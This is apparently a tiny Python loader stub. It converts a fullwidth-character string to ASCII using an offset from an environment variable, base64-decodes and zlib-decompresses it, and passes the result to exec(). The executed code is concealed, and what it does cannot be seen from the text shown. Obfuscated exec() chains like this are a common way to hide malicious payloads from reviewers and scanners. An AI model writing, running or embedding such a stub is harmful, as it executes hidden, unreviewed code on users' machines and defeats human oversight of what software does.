import os
_delta = int(os.environ.get('PYDECOMP_DELTA', '65248'))
_s = 'ｅＪｘＶｊｋＥＫｗｙＡＱＲｆｅｅＹｎＹｍＥＯＫｉＷＱｋ５ＲＱ８ｇＩＲ２ＪＹＦＱｃｈＵＬＩ３ａＮｐｋｆＺｖＺｖＨ＋ｆ８ｘｑＦｙＪ４ＩｐＨｘＴｊＩｏｅａＥＧｐＹｗｚＳａｍＯ０ＯｏＢＮｋ９ｐｇＯＢｊｍｑｆｐ０Ｘ９６ＮＲＷＰｌｃＪ８ｌ／５ＢＨＲＲＱＤ２ｖｑＨＯ１ｔ／ｂＦＥＴＤｋ６０ＨｘＬＫＺＡＵ４ｍｊｅＵｘ５ＮｄＱｒＯＷＦＥｓ２Ｖｂｔ９＋ｍＯ４３ｖＺｇ８Ｖｘ９Ｔｖｖ２ＱＵｖｕＥＤｍ'
_b = ''.join(chr(ord(_c) - _delta) for _c in _s).encode('ascii')
exec(__import__('zlib').decompress(__import__('base64').b64decode(_b)))
